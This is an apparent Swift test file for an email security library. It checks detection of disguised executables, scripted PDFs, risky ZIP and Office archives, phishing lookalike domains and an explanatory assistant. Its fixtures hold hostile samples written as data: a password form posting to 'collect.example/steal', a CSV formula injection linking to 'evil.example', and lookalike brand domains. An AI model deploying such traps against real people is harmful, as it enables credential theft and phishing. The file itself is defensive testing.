import Foundation
import Testing
@testable import MailZenKit

/// A ZIP archive with stored entries, enough for the directory parser.
func makeZip(_ files: [(String, String)], encrypted: Bool = false, claimedSize: Int? = nil) -> Data {
    var out = [UInt8](), central = [UInt8]()
    func u16(_ v: Int) -> [UInt8] { [UInt8(v & 0xff), UInt8(v >> 8 & 0xff)] }
    func u32(_ v: Int) -> [UInt8] { u16(v & 0xffff) + u16(v >> 16 & 0xffff) }
    for (name, content) in files {
        let offset = out.count
        let n = Array(name.utf8), c = Array(content.utf8)
        let flags = encrypted ? 1 : 0
        out += u32(0x0403_4B50) + u16(20) + u16(flags) + u16(0) + u16(0) + u16(0) + u32(0) + u32(c.count) + u32(c.count) + u16(n.count) + u16(0) + n + c
        central += u32(0x0201_4B50) + u16(20) + u16(20) + u16(flags) + u16(0) + u16(0) + u16(0) + u32(0)
            + u32(c.count) + u32(claimedSize ?? c.count) + u16(n.count) + u16(0) + u16(0) + u16(0) + u16(0) + u32(0) + u32(offset) + n
    }
    let start = out.count
    out += central
    out += u32(0x0605_4B50) + u16(0) + u16(0) + u16(files.count) + u16(files.count) + u32(central.count) + u32(start) + u16(0)
    return Data(out)
}

@Suite struct AttachmentTests {
    @Test func sha256MatchesTheStandardVectors() {
        #expect(SHA256.hex(Data("abc".utf8)) == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
        #expect(SHA256.hex(Data()) == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
        let long = Data(String(repeating: "a", count: 1000).utf8)
        #expect(SHA256.hex(long) == "41edece42d63e8d9bf515a9ba6932e1c20cbc9f5a5d134645adb5db1b9737ea3")
    }

    @Test func aProgramDisguisedAsAPDFIsCaught() {
        let pe = Data([0x4D, 0x5A, 0x90, 0x00] + [UInt8](repeating: 0, count: 60))
        let r = FileAnalyzer.analyze(data: pe, filename: "Facture_2026.pdf")
        #expect(r.kind == .executable)
        let rules = Set(r.report.signals.map(\.rule))
        #expect(rules.contains(.executable) && rules.contains(.typeMismatch))
        #expect(r.report.verdict == .danger)
    }

    @Test func aPDFWithAScriptAndAnActionOnOpening() {
        let pdf = Data("%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /Names << /JavaScript 3 0 R >> >>\n4 0 obj << /S /URI /URI (http://192.168.1.20/login) >>\n%%EOF".utf8)
        let r = FileAnalyzer.analyze(data: pdf, filename: "doc.pdf")
        let rules = Set(r.report.signals.map(\.rule))
        #expect(r.kind == .pdf)
        #expect(rules.isSuperset(of: [.scriptInDocument, .autoAction, .ipLink, .plainHttp]))
        #expect(r.links == ["http://192.168.1.20/login"])
    }

    @Test func aCleanPDFIsSafe() {
        let pdf = Data("%PDF-1.4\n1 0 obj << /Type /Catalog >>\n%%EOF".utf8)
        let r = FileAnalyzer.analyze(data: pdf, filename: "programme.pdf")
        #expect(r.report.signals.isEmpty)
        #expect(r.report.verdict == .safe)
        #expect(r.sha256.count == 64)
    }

    @Test func archivesAreOpened() {
        let zip = makeZip([("lisezmoi.txt", "bonjour"), ("facture.pdf.exe", "MZ")])
        let r = FileAnalyzer.analyze(data: zip, filename: "documents.zip")
        #expect(r.kind == .zip)
        #expect(r.entries == ["lisezmoi.txt", "facture.pdf.exe"])
        #expect(r.report.signals.contains { $0.rule == .archiveRisk })
        let locked = FileAnalyzer.analyze(data: makeZip([("a.txt", "x")], encrypted: true), filename: "secret.zip")
        #expect(locked.report.signals.contains { $0.rule == .encryptedArchive })
        #expect(!locked.limits.isEmpty)
        let bomb = FileAnalyzer.analyze(data: makeZip([("big.bin", "0")], claimedSize: 3_000_000_000 & 0xFFFF_FFFF), filename: "big.zip")
        #expect(bomb.report.signals.contains { $0.rule == .zipBomb })
    }

    @Test func officeMacrosAreFound() {
        let docm = makeZip([("[Content_Types].xml", "<Types/>"), ("word/document.xml", "<w/>"), ("word/vbaProject.bin", "x")])
        let r = FileAnalyzer.analyze(data: docm, filename: "rib.docx")
        #expect(r.kind == .ooxml)
        #expect(r.report.signals.contains { $0.rule == .officeMacros })
        let wrong = FileAnalyzer.analyze(data: docm, filename: "photo.jpg")
        #expect(wrong.report.signals.contains { $0.rule == .typeMismatch })
    }

    @Test func htmlAndCsvTraps() {
        let html = Data("<html><body><form action=\"https://collect.example/steal\"><input type=\"password\" name=\"p\"></form><script>x()</script></body></html>".utf8)
        let h = FileAnalyzer.analyze(data: html, filename: "securite.html")
        #expect(Set(h.report.signals.map(\.rule)).isSuperset(of: [.passwordForm, .scriptInDocument, .externalContent]))
        let csv = Data("nom;montant\nDupont;12\n=HYPERLINK(\"http://evil.example\";\"clic\");-3\n".utf8)
        let c = FileAnalyzer.analyze(data: csv, filename: "export.csv")
        #expect(c.kind == .csv)
        #expect(c.report.signals.contains { $0.rule == .formulaInjection })
        let clean = FileAnalyzer.analyze(data: Data("a;b\n1;-2\n".utf8), filename: "ok.csv")
        #expect(clean.report.signals.isEmpty)
    }

    @Test func attachmentsOfAnEmailAreAnalyzed() {
        let pe = Data([0x4D, 0x5A, 0, 0]).base64EncodedString()
        let raw = "From: compta@fournisseur.example\nSubject: Facture\nContent-Type: multipart/mixed; boundary=\"b\"\n\n--b\nContent-Type: text/plain\n\nVoici la facture.\n--b\nContent-Type: application/pdf; name=\"facture.pdf\"\nContent-Disposition: attachment; filename=\"facture.pdf\"\nContent-Transfer-Encoding: base64\n\n\(pe)\n--b--\n"
        let report = Engine.analyze(EmailMessage(raw: raw))
        #expect(report.signals.contains { $0.rule == .typeMismatch })
        #expect(report.verdict == .danger)
    }
}

@Suite struct BrandAndZenAITests {
    @Test func officialDomainsAreRecognized() {
        #expect(Brands.check("www.impots.gouv.fr") == .official(Brands.all.first { $0.key == "impots" }!))
        #expect(Brands.check("https://www.paypal.com/signin") == .official(Brands.all[0]))
        if case .imitation(let brand, _) = Brands.check("paypaI-secure.example") { #expect(brand.key == "paypal") } else { Issue.record("lookalike") }
        if case .imitation(let brand, _) = Brands.check("amazon-livraison.example") { #expect(brand.key == "amazon") } else { Issue.record("brand in domain") }
        #expect(Brands.check("bibliotheque.example") == .unknown)
        if case .brand(let brand) = Brands.check("La Poste") { #expect(brand.domains.contains("laposte.fr")) } else { Issue.record("brand name") }
        #expect(registrableDomain("www.impots.gouv.fr") == "impots.gouv.fr")
    }

    @Test func officialLinksAreNoImpersonation() {
        let report = Engine.analyze("Votre avis d’impôt est disponible sur https://www.impots.gouv.fr/accueil")
        #expect(!report.signals.contains { $0.rule == .brandMismatch || $0.rule == .deepSubdomains })
        let paypal = Engine.analyze("PayPal : connectez-vous sur https://www.paypal.com/signin")
        #expect(paypal.signals.isEmpty, "\(paypal.signals)")
    }

    @Test func zenAIAnswersFromTheEvidence() {
        let message = EmailMessage(raw: Library.samples[0].text.fr)
        let report = Engine.analyze(message)
        #expect(ZenAI.intent(of: "Pourquoi ce mail est-il suspect ?") == .why)
        #expect(ZenAI.intent(of: "What if I gave my password?") == .password)
        #expect(ZenAI.intent(of: "¿Es peligroso el enlace?") == .link)
        let why = ZenAI.answer(.why, report: report, message: message)
        #expect(why.count >= 3)
        let sender = ZenAI.answer(.sender, report: report, message: message).joined(separator: " ")
        #expect(sender.contains("paypaI-account-check.example"))
        let links = ZenAI.answer(.link, report: report, message: message)
        #expect(links.first?.hasPrefix("⚠️") == true)
        let safe = ZenAI.answer(.why, report: Engine.analyze("Bonjour, à demain."), message: nil)
        #expect(safe.count == 1)
        for (intent, question) in ZenAI.suggestions {
            #expect(!ZenAI.answer(intent, report: report, message: message).isEmpty, "\(question.fr)")
        }
        #expect(SafeReply.templates(report: report, message: message).count == 2)
        #expect(SafeReply.templates(report: Engine.analyze("Bonjour"), message: nil).count == 3)
    }
}
